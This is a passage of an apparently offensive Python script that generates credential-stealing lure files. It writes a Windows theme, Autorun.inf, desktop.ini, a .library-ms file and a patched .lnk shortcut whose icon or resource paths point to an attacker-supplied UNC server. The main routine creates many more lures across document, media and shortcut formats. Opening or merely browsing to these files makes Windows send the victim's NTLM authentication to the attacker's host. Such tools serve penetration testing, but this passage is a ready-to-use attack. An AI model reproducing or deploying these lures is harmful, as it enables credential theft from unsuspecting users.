SystemMode=Light
AppMode=Light

[boot]
SCRNSAVE.EXE=

[MasterThemeSelector]
MTSM=RJSPBS

[Sounds]
; IDS_SCHEME_DEFAULT
SchemeName=@\\\\'''+server+'''\\setup.dll,-800
		''')
	print_success(filename, "INSTALL THEME")

def create_autoruninf(generate,server,filename):
	if generate == "modern":
		print_skip("Autorun.inf", "does not work on modern Windows")
		return
	file = open(filename,'w')
	file.write('''[autorun]
open=\\\\''' + server + '''\\setup.exe
icon=something.ico
action=open Setup.exe''')
	file.close()
	print_success(filename, "BROWSE TO FOLDER")

def create_desktopini(generate,server,filename):
	if generate == "modern":
		print_skip("desktop.ini", "does not work on modern Windows")
		return
	file = open(filename,'w')
	file.write('''[.ShellClassInfo]
IconResource=\\\\''' + server + '''\\aa''')
	file.close()
	print_success(filename, "BROWSE TO FOLDER")

def create_libraryms(generate,server,filename):
	file = open(filename,'w')
	file.write('''<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@shell32.dll,-34575</name>
<ownerSID>S-1-5-21-372074477-2495183225-776587326-1000</ownerSID>
<version>1</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>\\\\''' + server + '''\\aa</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription publisher="Microsoft" product="Windows">
<description>@shell32.dll,-34577</description>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<simpleLocation>
<url>knownfolder:{FDD39AD0-238F-46AF-ADB4-6C85480369C7}</url>
<serialized>MBAAAEAFCAAA...MFNVAAAAAA</serialized>
</simpleLocation>
</searchConnectorDescription>
<searchConnectorDescription publisher="Microsoft" product="Windows">
<description>@shell32.dll,-34579</description>
<isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
<simpleLocation>
<url>knownfolder:{ED4824AF-DCE4-45A8-81E2-FC7965083634}</url>
<serialized>MBAAAEAFCAAA...HJIfK9AAAAAA</serialized>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>''')
	file.close()
	print_success(filename, "BROWSE TO FOLDER")


def create_lnk(generate,server,filename):
	offset = 0x136
	max_path = 0xDF
	unc_path = f'\\\\{server}\\tools\\nc.ico'
	if len(unc_path) >= max_path:
		print_skip("LNK", "server name too long for template")
		return
	unc_path = unc_path.encode('utf-16le')
	with open(os.path.join(script_directory,"templates", "shortcut-template.lnk"), 'rb') as lnk:
		shortcut = list(lnk.read())
	for i in range(0, len(unc_path)):
		shortcut[offset + i] = unc_path[i]
	with open(filename,'wb') as file:
		file.write(bytes(shortcut))
	print_success(filename, "BROWSE TO FOLDER")


if os.path.exists(args.filename):
	if not args.force:
		if input(f"Are you sure to want to delete {args.filename}? [Y/N] ").lower() not in ["y", "yes"]:
			exit(0)
	shutil.rmtree(args.filename)
os.makedirs(args.filename)

# handle which documents to create
if (args.generate == "all" or args.generate == "modern"):
	create_scf(args.generate, args.server, os.path.join(args.filename, args.filename + ".scf"))

	create_url_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(url).url"))
	create_url_icon(args.generate, args.server, os.path.join(args.filename, args.filename + "-(icon).url"))

	create_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + ".lnk"))

	create_rtf(args.generate, args.server, os.path.join(args.filename, args.filename + ".rtf"))

	create_xml(args.generate, args.server, os.path.join(args.filename, args.filename + "-(stylesheet).xml"))
	create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(fulldocx).xml"))

	create_htm(args.generate, args.server, os.path.join(args.filename, args.filename + ".htm"))
	create_htm_handler(args.generate, args.server, os.path.join(args.filename, args.filename + "-(handler).htm"))

	create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(includepicture).docx"))
	create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, args.filename + "-(remotetemplate).docx"))
	create_docx_frameset(args.generate, args.server, os.path.join(args.filename, args.filename + "-(frameset).docx"))

	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))

	create_wax(args.generate, args.server, os.path.join(args.filename, args.filename + ".wax"))

	create_m3u(args.generate, args.server, os.path.join(args.filename, args.filename + ".m3u"))

	create_asx(args.generate, args.server, os.path.join(args.filename, args.filename + ".asx"))

	create_jnlp(args.generate, args.server, os.path.join(args.filename, args.filename + ".jnlp"))

	create_application(args.generate, args.server, os.path.join(args.filename, args.filename + ".application"))

	create_pdf(args.generate, args.server, os.path.join(args.filename, args.filename + ".pdf"))

	create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))

	create_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + ".library-ms"))

	create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))

	create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))

	create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))

	create_odt(args.generate, args.server, os.path.join(args.filename, args.filename + ".odt"))

elif args.generate == "odt":
	create_odt(args.generate, args.server, os.path.join(args.filename, args.filename + ".odt"))

elif(args.generate == "scf"):
	create_scf(args.generate, args.server, os.path.join(args.filename, args.filename + ".scf"))

elif(args.generate == "url"):
	create_url_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(url).url"))
	create_url_icon(args.generate, args.server, os.path.join(args.filename, args.filename + "-(icon).url"))

elif(args.generate == "lnk"):
	create_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + ".lnk"))

elif(args.generate == "rtf"):
	create_rtf(args.generate, args.server, os.path.join(args.filename, args.filename + ".rtf"))

elif(args.generate == "xml"):
	create_xml(args.generate, args.server, os.path.join(args.filename, args.filename + "-(stylesheet).xml"))
	create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(fulldocx).xml"))

elif(args.generate == "htm"):
	create_htm(args.generate, args.server, os.path.join(args.filename, args.filename + ".htm"))

elif(args.generate == "docx"):
	create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(includepicture).docx"))
	create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, args.filename + "-(remotetemplate).docx"))
	create_docx_frameset(args.generate, args.server, os.path.join(args.filename, args.filename + "-(frameset).docx"))

elif(args.generate == "xlsx"):
	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))
	
elif(args.generate == "wax"):
	create_wax(args.generate, args.server, os.path.join(args.filename, args.filename + ".wax"))

elif(args.generate == "m3u"):
	create_m3u(args.generate, args.server, os.path.join(args.filename, args.filename + ".m3u"))

elif(args.generate == "asx"):
	create_asx(args.generate, args.server, os.path.join(args.filename, args.filename + ".asx"))

elif(args.generate == "jnlp"):
	create_jnlp(args.generate, args.server, os.path.join(args.filename, args.filename + ".jnlp"))

elif(args.generate == "application"):
	create_application(args.generate, args.server, os.path.join(args.filename, args.filename + ".application"))

elif(args.generate == "pdf"):
	create_pdf(args.generate, args.server, os.path.join(args.filename, args.filename + ".pdf"))

elif(args.generate == "zoom"):
	create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))

elif(args.generate == "libraryms"):
	create_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + ".library-ms"))

elif(args.generate == "autoruninf"):
	create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))

elif(args.generate == "desktopini"):
	create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))

elif(args.generate == "theme"):
	create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))

print_summary()

